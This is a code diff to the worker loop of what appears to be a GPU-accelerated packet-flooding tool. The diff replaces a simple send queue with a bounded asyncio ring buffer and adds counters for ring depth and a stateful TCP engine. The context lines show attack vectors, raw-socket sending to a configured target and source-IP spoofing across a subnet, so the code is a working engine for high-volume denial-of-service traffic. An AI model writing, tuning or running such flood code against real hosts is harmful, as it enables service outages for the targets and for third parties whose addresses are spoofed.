@@ -93,6 +93,11 @@ def _empty_stats() -> dict:
         "gpu_template_h2d_copy_bytes": 0,
         "gpu_rng_state_alloc_count": 0,
         "gpu_rng_state_reuse_count": 0,
+        "gpu_ring_depth_peak": 0,
+        "gpu_ring_block_wait_ns": 0,
+        "state_active_entries": 0,
+        "state_timeout_evictions": 0,
+        "state_overwrites": 0,
     }
 
 
@@ -207,6 +212,16 @@ def _add_stats(acc: dict, item: dict) -> dict:
     acc["gpu_template_h2d_copy_bytes"] = int(acc.get("gpu_template_h2d_copy_bytes", 0)) + int(item.get("gpu_template_h2d_copy_bytes", 0) or 0)
     acc["gpu_rng_state_alloc_count"] = int(acc.get("gpu_rng_state_alloc_count", 0)) + int(item.get("gpu_rng_state_alloc_count", 0) or 0)
     acc["gpu_rng_state_reuse_count"] = int(acc.get("gpu_rng_state_reuse_count", 0)) + int(item.get("gpu_rng_state_reuse_count", 0) or 0)
+    acc["gpu_ring_depth_peak"] = max(
+        int(acc.get("gpu_ring_depth_peak", 0) or 0),
+        int(item.get("gpu_ring_depth_peak", 0) or 0),
+    )
+    acc["gpu_ring_block_wait_ns"] = int(acc.get("gpu_ring_block_wait_ns", 0)) + int(item.get("gpu_ring_block_wait_ns", 0) or 0)
+    _state_active = int(item.get("state_active_entries", 0) or 0)
+    if _state_active > 0 or int(acc.get("state_active_entries", 0) or 0) == 0:
+        acc["state_active_entries"] = _state_active
+    acc["state_timeout_evictions"] = int(acc.get("state_timeout_evictions", 0)) + int(item.get("state_timeout_evictions", 0) or 0)
+    acc["state_overwrites"] = int(acc.get("state_overwrites", 0)) + int(item.get("state_overwrites", 0) or 0)
     item_sender_path = str(item.get("sender_path", "") or "").strip()
     if item_sender_path:
         current = str(acc.get("sender_path", "") or "").strip()
@@ -316,6 +331,11 @@ async def worker_process(
     backend_used = "cpu"
     worker_stats = _empty_stats()
     _gpu_packet_mod = None
+    _gpu_ring_depth_peak = 0
+    _gpu_ring_block_wait_ns = 0
+
+    def _update_state_engine_stats():
+        return
 
     fault_inject_set = {
         str(x).strip().lower()
@@ -544,6 +564,120 @@ async def worker_process(
                 except Exception:
                     # Conservative fallback for environments without query()
                     evt.synchronize()
+
+            try:
+                gpu_packet.configure_pinned_host_pool(max_mb=int(args.get("gpu_pinned_max_mb", 512) or 512))
+            except Exception as e:
+                log_warning(f"[Worker {worker_id}] pinned pool configure failed: {e}")
+
+            _gpu_ring_capacity = max(1, int(args.get("gpu_ring_capacity", 3) or 3))
+            _gpu_ring_depth_peak = 0
+            _gpu_ring_block_wait_ns = 0
+
+            _state_engine_ready = False
+            _state_sweep_interval_s = max(
+                0.05,
+                float(int(args.get("state_sweep_interval_ms", 1000) or 1000)) / 1000.0,
+            )
+            _last_state_sweep = time.time()
+
+            if getattr(senders, "FAST_SENDER_AVAILABLE", False) and hasattr(senders, "fast_sender"):
+                fs = senders.fast_sender
+                if hasattr(fs, "configure_state_engine"):
+                    try:
+                        fs.configure_state_engine(
+                            int(args.get("state_table_size", 65536) or 65536),
+                            int(args.get("state_lock_count", 256) or 256),
+                            int(args.get("state_timeout_sec", 60) or 60),
+                        )
+                        _state_engine_ready = True
+                    except Exception as e:
+                        log_warning(f"[Worker {worker_id}] state engine configure failed: {e}")
+
+            def _update_state_engine_stats():
+                nonlocal worker_stats
+                if not _state_engine_ready:
+                    return
+                if not getattr(senders, "FAST_SENDER_AVAILABLE", False) or not hasattr(senders, "fast_sender"):
+                    return
+                fs = senders.fast_sender
+                if not hasattr(fs, "get_state_engine_stats"):
+                    return
+                try:
+                    st = fs.get_state_engine_stats() or {}
+                    worker_stats["state_active_entries"] = int(st.get("active_entries", 0) or 0)
+                    worker_stats["state_timeout_evictions"] = int(st.get("timeout_evictions", 0) or 0)
+                    worker_stats["state_overwrites"] = int(st.get("overwrites", 0) or 0)
+                except Exception:
+                    pass
+
+            def _ingest_state_from_batch(batch, sent_count: int):
+                if sent_count <= 0 or not _state_engine_ready:
+                    return
+                if not getattr(senders, "FAST_SENDER_AVAILABLE", False) or not hasattr(senders, "fast_sender"):
+                    return
+                fs = senders.fast_sender
+                if not hasattr(fs, "ingest_tx_packets"):
+                    return
+                try:
+                    fs.ingest_tx_packets(
+                        batch.get("cpu"),
+                        int(batch.get("packet_size", 0) or 0),
+                        int(sent_count),
+                    )
+                except Exception:
+                    pass
+
+            def _maybe_sweep_state():
+                nonlocal _last_state_sweep
+                if not _state_engine_ready:
+                    return
+                now = time.time()
+                if (now - _last_state_sweep) < _state_sweep_interval_s:
+                    return
+                _last_state_sweep = now
+                if not getattr(senders, "FAST_SENDER_AVAILABLE", False) or not hasattr(senders, "fast_sender"):
+                    return
+                fs = senders.fast_sender
+                if not hasattr(fs, "sweep_state_table"):
+                    return
+                try:
+                    fs.sweep_state_table(4096)
+                except Exception:
+                    pass
+
+            async def _enqueue_with_backpressure(ring_q: asyncio.Queue, batch_item: dict):
+                nonlocal _gpu_ring_depth_peak, _gpu_ring_block_wait_ns
+                was_full = ring_q.full()
+                t0 = time.perf_counter_ns() if was_full else 0
+                await ring_q.put(batch_item)
+                waited_ns = max(0, time.perf_counter_ns() - t0) if was_full else 0
+                _gpu_ring_block_wait_ns += waited_ns
+                qsz = ring_q.qsize()
+                if qsz > _gpu_ring_depth_peak:
+                    _gpu_ring_depth_peak = qsz
+
+            async def _consume_one_ring_batch(ring_q: asyncio.Queue, target_port: int, ingest_state: bool = False):
+                nonlocal worker_stats
+                if ring_q.empty():
+                    return
+                send_batch = await ring_q.get()
+                await _await_cuda_event(send_batch["ready_event"])
+                send_stats = await senders.paced_raw_socket_sender(
+                    packets_buffer=send_batch["cpu"],
+                    target_ip=args['target'],
+                    target_port=target_port,
+                    count=send_batch["count"],
+                    verbose=args['verbose'],
+                    pacing_config=pacing_cfg,
+                    live_sent=sent_total,
+                    live_errors=errors_total,
+                    live_progress=progress,
+                )
+                worker_stats = _add_stats(worker_stats, send_stats)
+                if ingest_state:
+                    _ingest_state_from_batch(send_batch, int(send_stats.get("sent", 0) or 0))
+                _maybe_sweep_state()
             
             # Re-import senders as something else if needed, OR relies on top-level import
             # The error is likely because `senders` was imported inside this block in a previous version
@@ -767,7 +901,7 @@ async def worker_process(
                     cp.cuda.Stream(non_blocking=True),
                 ]
                 stream_idx = 0
-                ready_queue = []
+                ring_q = asyncio.Queue(maxsize=_gpu_ring_capacity)
                 BATCH_SIZE = int(os.environ.get("SAMURAI_GPU_BATCH", 100000))
                 remaining = args['count']
 
@@ -790,51 +924,33 @@ async def worker_process(
                             blocking=False,
                         ),
                         "count": batch_count,
+                        "packet_size": int(packet_size),
                         "stream": stream_ring[stream_idx],
                         "slot": stream_idx,
                         "ready_event": cp.cuda.Event(),
                     }
                     current_batch["ready_event"].record(current_batch["stream"])
-                    ready_queue.append(current_batch)
+                    if ring_q.full():
+                        await _consume_one_ring_batch(ring_q, 0, ingest_state=True)
+                    await _enqueue_with_backpressure(ring_q, current_batch)
                     stream_idx = (stream_idx + 1) % 3
                     remaining -= batch_count
 
-                    if len(ready_queue) >= 2:
-                        send_batch = ready_queue.pop(0)
-                        await _await_cuda_event(send_batch["ready_event"])
-                        worker_stats = _add_stats(worker_stats, await senders.paced_raw_socket_sender(
-                            packets_buffer=send_batch["cpu"],
-                            target_ip=args['target'],
-                            target_port=0,
-                            count=send_batch["count"],
-                            verbose=args['verbose'],
-                            pacing_config=pacing_cfg,
-                            live_sent=sent_total,
-                            live_errors=errors_total,
-                            live_progress=progress
-                        ))
+                    if ring_q.qsize() >= 2:
+                        await _consume_one_ring_batch(ring_q, 0, ingest_state=True)
 
                     await asyncio.sleep(0)
 
-                while ready_queue:
-                    send_batch = ready_queue.pop(0)
-                    await _await_cuda_event(send_batch["ready_event"])
-                    worker_stats = _add_stats(worker_stats, await senders.paced_raw_socket_sender(
-                        packets_buffer=send_batch["cpu"],
-                        target_ip=args['target'],
-                        target_port=0,
-                        count=send_batch["count"],
-                        verbose=args['verbose'],
-                        pacing_config=pacing_cfg,
-                        live_sent=sent_total,
-                        live_errors=errors_total,
-                        live_progress=progress
-                    ))
+                while not ring_q.empty():
+                    await _consume_one_ring_batch(ring_q, 0, ingest_state=True)
                 return
 
             # --- STATEFUL TCP MODE ---
             if args.get('stateful', False):
                 log_info("Initializing Stateful TCP Engine (Viper-State)...")
+                if not getattr(senders, "FAST_SENDER_AVAILABLE", False) or not hasattr(senders, "fast_sender"):
+                    log_error("Stateful mode requires fast_sender C extension.")
+                    return
                 
                 # 1. Start RX Handler (C Extension)
                 iface, gw_mac_bytes = senders.get_gateway_info(args['target'])
@@ -853,7 +969,8 @@ async def worker_process(
                 max_t_size = 0
                 raw_templates = []
                 
-                for _ in range(10):
+                stateful_pool_size = max(1, int(args.get("gpu_template_pool_size_l4", 10) or 10))
+                for _ in range(stateful_pool_size):
                     pkt_config = packet.PacketConfig(
                         target_ip=args['target'], 
                         target_port=args['port'],
@@ -905,7 +1022,6 @@ async def worker_process(
                 log_info(f"Using local IP {local_ip} for state tracking.")
 
                 start_time = time.time()
-                packets_sent = 0
                 
                 # Partition source ports by worker_id to avoid state table collisions
                 # Total available ports: 65535 - 1024 = 64511
@@ -914,7 +1030,7 @@ async def worker_process(
                 ports_per_worker = 64511 // num_workers
                 start_port = 1024 + (worker_id * ports_per_worker)
                 
-                ready_queue = []
+                ring_q = asyncio.Queue(maxsize=_gpu_ring_capacity)
                 while True:
                     # Poll State Table in BATCH (C Extension)
                     # We use local_ip_int for lookup and the worker's specific start_port
@@ -950,53 +1066,29 @@ async def worker_process(
                             blocking=False,
                         ),
                         "count": args['count'],
+                        "packet_size": int(packet_size),
                         "stream": stream_ring[stream_idx],
                         "slot": stream_idx,
                         "ready_event": cp.cuda.Event(),
                     }
                     current_batch["ready_event"].record(current_batch["stream"])
-                    ready_queue.append(current_batch)
+                    if ring_q.full():
+                        await _consume_one_ring_batch(ring_q, args['port'], ingest_state=True)
+                    await _enqueue_with_backpressure(ring_q, current_batch)
                     stream_idx = (stream_idx + 1) % 3
 
-                    if len(ready_queue) >= 2:
-                        send_batch = ready_queue.pop(0)
-                        await _await_cuda_event(send_batch["ready_event"])
-                        send_stats = await senders.paced_raw_socket_sender(
-                            packets_buffer=send_batch["cpu"],
-                            target_ip=args['target'],
-                            target_port=args['port'],
-                            count=send_batch["count"],
-                            verbose=args['verbose'],
-                            pacing_config=pacing_cfg,
-                            live_sent=sent_total,
-                            live_errors=errors_total,
-                            live_progress=progress
-                        )
-                        worker_stats = _add_stats(worker_stats, send_stats)
-                        packets_sent += send_batch["count"]
+                    if ring_q.qsize() >= 2:
+                        await _consume_one_ring_batch(ring_q, args['port'], ingest_state=True)
 
-                        # In stateful mode, we need to loop to allow handshakes to complete.
-                        if args['count'] > 0 and time.time() - start_time > 5:
-                            ready_queue = []
-                            break
+                    # In stateful mode, we need to loop to allow handshakes to complete.
+                    if args['count'] > 0 and time.time() - start_time > 5:
+                        break
 
                     await asyncio.sleep(0.1)
 
-                while ready_queue:
-                    send_batch = ready_queue.pop(0)
-                    await _await_cuda_event(send_batch["ready_event"])
-                    send_stats = await senders.paced_raw_socket_sender(
-                        packets_buffer=send_batch["cpu"],
-                        target_ip=args['target'],
-                        target_port=args['port'],
-                        count=send_batch["count"],
-                        verbose=args['verbose'],
-                        pacing_config=pacing_cfg,
-                        live_sent=sent_total,
-                        live_errors=errors_total,
-                        live_progress=progress
-                    )
-                    worker_stats = _add_stats(worker_stats, send_stats)
+                while not ring_q.empty():
+                    await _consume_one_ring_batch(ring_q, args['port'], ingest_state=True)
+                _update_state_engine_stats()
                 return
 
             # --- ANOMALY MODE (GPU) ---
@@ -1192,9 +1284,9 @@ async def worker_process(
             
             # Determine Pool Size
             if args['attack_vector'] in ["http", "http2"]:
-                TEMPLATE_POOL_SIZE = 50
+                TEMPLATE_POOL_SIZE = max(1, int(args.get("gpu_template_pool_size_l7", 50) or 50))
             else:
-                TEMPLATE_POOL_SIZE = 10
+                TEMPLATE_POOL_SIZE = max(1, int(args.get("gpu_template_pool_size_l4", 10) or 10))
                 
             template_pool = []
             # log_info(f"Generating template pool of size {TEMPLATE_POOL_SIZE}...") # Avoid spamming logs per worker
@@ -1308,6 +1400,13 @@ async def worker_process(
             BATCH_SIZE = int(os.environ.get("SAMURAI_GPU_BATCH", 100000))
             total_count = args['count']
             remaining = total_count
+            stream_ring = [
+                cp.cuda.Stream(non_blocking=True),
+                cp.cuda.Stream(non_blocking=True),
+                cp.cuda.Stream(non_blocking=True),
+            ]
+            stream_idx = 0
+            ring_q = asyncio.Queue(maxsize=_gpu_ring_capacity)
             
             log_info(f"[Worker {worker_id}] GPU attack starting: {total_count} packets in batches of {BATCH_SIZE}")
             
@@ -1326,7 +1425,7 @@ async def worker_process(
                     real_src_ip=(args.get('spoof_ip') or utils.get_local_ip()),
                     specific_src_port=args.get('source_port', -1),
                     has_ethernet=True,
-                    stream=None,
+                    stream=stream_ring[stream_idx],
                     gateway_mac=gw_mac_int,
                     spoof_subnet=args.get('spoof_subnet', '1.0.0.0/8')
                 )
@@ -1338,27 +1437,32 @@ async def worker_process(
                 packets_gpu_array, packet_size = gpu_res
                 remaining -= batch_count
 
-                cpu_packets = _gpu_to_host(
-                    packets_gpu_array,
-                    "template_pool_slot0",
-                    stream=None,
-                    blocking=True,
-                )
+                current_batch = {
+                    "cpu": _gpu_to_host(
+                        packets_gpu_array,
+                        f"template_pool_slot{stream_idx}",
+                        stream=stream_ring[stream_idx],
+                        blocking=False,
+                    ),
+                    "count": batch_count,
+                    "packet_size": int(packet_size),
+                    "stream": stream_ring[stream_idx],
+                    "slot": stream_idx,
+                    "ready_event": cp.cuda.Event(),
+                }
+                current_batch["ready_event"].record(current_batch["stream"])
+                if ring_q.full():
+                    await _consume_one_ring_batch(ring_q, args['port'], ingest_state=True)
+                await _enqueue_with_backpressure(ring_q, current_batch)
+                stream_idx = (stream_idx + 1) % len(stream_ring)
 
-                batch_stats = await senders.paced_raw_socket_sender(
-                    packets_buffer=cpu_packets,
-                    target_ip=args['target'],
-                    target_port=args['port'],
-                    count=batch_count,
-                    verbose=args['verbose'],
-                    pacing_config=pacing_cfg,
-                    live_sent=sent_total,
-                    live_errors=errors_total,
-                    live_progress=progress
-                )
-                worker_stats = _add_stats(worker_stats, batch_stats)
+                if ring_q.qsize() >= 2:
+                    await _consume_one_ring_batch(ring_q, args['port'], ingest_state=True)
 
                 await asyncio.sleep(0)
+
+            while not ring_q.empty():
+                await _consume_one_ring_batch(ring_q, args['port'], ingest_state=True)
 
         elif args['attack_vector'] == "http":
             verify_ssl = (str(args['http_verify']).lower() != "false")
@@ -1578,6 +1682,10 @@ async def worker_process(
                 except Exception:
                     pass
 
+            worker_stats["gpu_ring_depth_peak"] = int(max(0, _gpu_ring_depth_peak))
+            worker_stats["gpu_ring_block_wait_ns"] = int(max(0, _gpu_ring_block_wait_ns))
+            _update_state_engine_stats()
+
             # Recompute bounded loss metrics at worker finalization.
             worker_stats = _recompute_loss_metrics(worker_stats)
         except Exception:
@@ -1742,6 +1850,11 @@ async def worker_process(
                         "gpu_template_h2d_copy_bytes": _gpu_template_h2d_copy_bytes,
                         "gpu_rng_state_alloc_count": _gpu_rng_state_alloc_count,
                         "gpu_rng_state_reuse_count": _gpu_rng_state_reuse_count,
+                        "gpu_ring_depth_peak": int(worker_stats.get("gpu_ring_depth_peak", 0) or 0),
+                        "gpu_ring_block_wait_ns": int(worker_stats.get("gpu_ring_block_wait_ns", 0) or 0),
+                        "state_active_entries": int(worker_stats.get("state_active_entries", 0) or 0),
+                        "state_timeout_evictions": int(worker_stats.get("state_timeout_evictions", 0) or 0),
+                        "state_overwrites": int(worker_stats.get("state_overwrites", 0) or 0),
                         "queue_backlog_peak": _backlog_peak,
                     }
                 )
